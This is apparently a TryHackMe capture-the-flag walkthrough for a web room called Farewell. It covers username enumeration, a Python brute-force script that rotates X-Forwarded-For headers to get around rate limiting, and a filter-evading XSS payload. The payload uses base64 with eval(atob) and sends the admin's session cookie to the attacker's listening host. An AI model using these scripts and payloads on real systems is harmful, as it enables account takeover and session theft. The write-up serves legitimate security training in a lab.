# Farewell - TryHackMe Walkthrough

**Difficulty:** medium  
**OS:** linux (Web)

## Recon

starting with scanning the box we can see two ports open. `ssh` and `http`. don't know why ssh is open because this box is all about exploiting web and getting access to admin panel.

```
# Nmap 7.94SVN scan initiated Wed Nov 19 20:18:33 2025 as: nmap -sC -sV -vv -oN enum.txt 10.10.77.69
Nmap scan report for 10.10.77.69
Host is up, received syn-ack (0.19s latency).
Scanned at 2025-11-19 20:18:34 +0330 for 45s
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 c1:e7:40:bf:83:bb:3f:73:25:38:98:52:74:3f:ec:d5 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPIbouWdmVFtd58rqYv0uLSQ3e9QEqikO8HH5agPlLxlv5H6mcScId1fy3oEg1/9LckTnp7WtwsySELbCknQ3/s=
|   256 b6:b5:66:38:40:8d:c7:a4:66:08:57:21:37:82:e4:22 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAxdYNVp+KiHS12/znmr0YEItzkXO3kbXso95iIvymFd
80/tcp open  http    syn-ack Apache httpd 2.4.58 ((Ubuntu))
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Farewell \xE2\x80\x94 Login
|_http-server-header: Apache/2.4.58 (Ubuntu)
```

you can find three usernames in the main page: `adam`, `deliver11` and `nora`

```
...
      <div class="tick-item">adam posted a message - 3 hrs ago</div>
      <div class="tick-item">deliver11 posted a message - 4 hrs ago</div>
      <div class="tick-item">nora posted a message - 1 day ago</div>
...
```

and if you test these users for login with incorrect password you will get a different error

### wrong username

```
Invalid username or password.
```

### correct username

```
Server hint: Invalid password against the user
```

i tested username `admin` and got server hint message indicating that username admin exists.

inspecting the response message coming from the server when you input a correct username with wrong password you will get a password hint for that user. so i gathered password hints for each user. the user `deliver11`'s password is more straight forward as other users password hints were a little bit vague.

```
{
    name: "admin",
    last_password_change: "2025-10-31 19:03:00",
    password_hint: "the year plus a kind send-off"
}

{
    name: "adam",
    last_password_change: "2025-10-21 09:12:00",
    password_hint: "favorite pet + 2"
}

{
    name: "deliver11",
    last_password_change: "2025-09-10 11:00:00",
    password_hint: "Capital of Japan followed by 4 digits"
}

{
    name: "nora",
    last_password_change: "2025-08-01 13:45:00",
    password_hint: "lucky number 789"
}
```

now we have to brute force the password but there is a problem. there is a rate limiting on the backend that would block you after 10 wrong login attempts with message `Network error. Try again.`

and this as the response:

![alt text](./Screenshot%20at%202025-11-20%2002-40-39.png)

Modifying headers to alter the perceived IP origin can help evade IP-based rate limiting. Headers such as `X-Originating-IP`, `X-Forwarded-For`, `X-Remote-IP`, `X-Remote-Addr`, `X-Client-IP`, `X-Host`, `X-Forwared-Host`  
i simply tested `X-Forwarded-For` and bypassed the rate limiting. but the backend keeps track of IP's with their total number of requests within short time. so our `X-Forwarded-For` value within header should change every **nth** request where **n** should be less than 10.

i wrote this python script to brute force user `deliver11`'s password while changing `X-Forwarded-For` every 5 request.
this user's password is simply `Tokyo`(capital of Japan) + 4 digits

```
import requests
import argparse
import ipaddress
from threading import Thread, Lock, Event
from queue import Queue


q = Queue()
lock = Lock()
stop_event = Event()
user_password = ""

# color for output
RESET = "\033[0m"
RED = "\033[31m"
GREEN = "\033[32m"
YELLOW = "\033[33m"

proxy = {"https": "https://127.0.0.1:8080", "http": "http://127.0.0.1:8080"}


def enumerate_users(target_url):
    global q
    global lock
    global user_password

    while not stop_event.is_set():
        username = "deliver11"
        password, ip = q.get()

        data = {"username": username, "password": password}
        headers = {
            "X-Forwarded-For": ip,
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0",
        }

        # set proxies=proxy if you want to analyze requests in burp
        res = requests.post(url=target_url, data=data, headers=headers, verify=False)

        if "auth_failed" not in res.text:
            user_password = password
            stop_event.set()

        # allowing only one thread to output to the terminal
        lock.acquire()
        try:
            print(f"[Trying password]: {RED + password + RESET}", end="\r")
        finally:
            lock.release()

        q.task_done()


def main():
    global q
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "-u",
        "--url",
        required=True,
        help="target url example http://farewell.thm:<port>/auth.php",
    )
    parser.add_argument(
        "-t", "--threads", default=10, help="Run script with <n> threads."
    )
    args = parser.parse_args()

    # waf has ratelimit of 10 tries for each IP before locking us out and it could be bypassed by X-Forwarded-For
    ip_list = list(ipaddress.ip_network("10.10.0.0/16"))
    ip = ip_list.pop()
    for i in range(10000):
        if i % 5 == 0:
            ip = ip_list.pop()
        q.put(("Tokyo{:04d}".format(i), str(ip)))

    ip_list.clear()

    threads = []
    for _ in range(int(args.threads)):
        t = Thread(target=enumerate_users, args=(args.url,), daemon=True)
        threads.append(t)
        t.start()

    try:
        for t in threads:
            t.join()
    except KeyboardInterrupt:
        print(f"\n{YELLOW}Exiting...{RESET}")
        stop_event.set()

    if user_password:
        print(f"Password found!!!: {GREEN + user_password + RESET}")


if __name__ == "__main__":
    main()

```

```
┌─[10.14.89.8]─[deadmonarch@parrot]─[~/ctf/tryhackme/rooms/farewell]
└──╼ [★]$ python exploit.py -u http://farewell.thm/auth.php -t 60
Password found!!!: <REDACTED>

```

now we can login and get normal user flag

```
...
    <div class="card">
      <h1>Farewell Message - Flag: THM{REDACTED}</h1>
      <p>This is the farewell dashboard. The admin message is below.</p>

      <div class="flag">
        Hey everyone, thank you for your valuable feedback - the server will be decommissioned soon.
        Wishing you all the best ahead!
      </div>
...
```

logged in users have the capability to leave their message and admin will read them immediately.  
this feature is vulnerable to `XSS` because `/admin.php`, the page that only admin has access does not sanitize input before rendering it. so we can exploit this to get admin cookie and login with it.  
however backend is going block us if it detects some keywords like `fetch`, `cookie`, `<img src='1' onerror=...`
and input is limited to less than 100 characters.  
keep in mind that, there might be other ways to exploit this

one feature that can allow us to bypass waf is using `eval(atob("BASE64 PAYLOAD"))` which will execute base64 encoded javascript code.

```
echo -n 'fetch(`http://10.14.89.8/${document.cookie}`)' | base64

```

combining it with img tag:  
`<img src='1'>` was being blocked and changing `img` to `IMG` bypassed it.

```
<IMG src='1'onerror=eval(atob("ZmV0Y2goYGh0dHA6Ly8xMC4xNC44OS44LyR7ZG9jdW1lbnQuY29va2llfWAp")) />
```

setting up the python http server and you will catch the admin's cookie

```
┌─[10.14.89.8]─[deadmonarch@parrot]─[~/ctf/tryhackme/rooms/farewell]
└──╼ [★]$ sudo python -m http.server 80
[sudo] password for deadmonarch:
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.249.149 - - [20/Nov/2025 03:26:58] code 404, message File not found
10.10.249.149 - - [20/Nov/2025 03:26:58] "GET /PHPSESSID=81a0rg7bu0va6v7epoq8uarot1 HTTP/1.1" 404 -

```

admin flag can be obtained in `/admin.php` page.
